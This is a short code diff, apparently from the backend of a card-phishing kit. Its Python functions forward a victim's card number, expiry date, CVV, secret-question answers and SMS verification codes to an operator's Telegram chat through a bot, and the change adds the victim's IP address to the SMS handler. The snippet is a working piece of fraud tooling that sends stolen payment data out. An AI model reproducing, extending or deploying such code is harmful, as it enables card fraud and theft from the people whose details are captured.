@@ -56,7 +56,7 @@ def send_secret_question(CHAT_ID, card, date, cvv, question, ID, name):
     reply_markup = InlineKeyboardMarkup(keyboard)
     bot.send_message(chat_id=CHAT_ID, text=f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n❓  `{question}` '.replace('.', '\.'), reply_markup=reply_markup, parse_mode='MarkdownV2')
 
-def send_sms(CHAT_ID, card, date, cvv, sms, ID):
+def send_sms(CHAT_ID, card, date, cvv, sms, ID, ip):
     bot = Bot(token=API_TOKEN)
     keyboard = [
         [
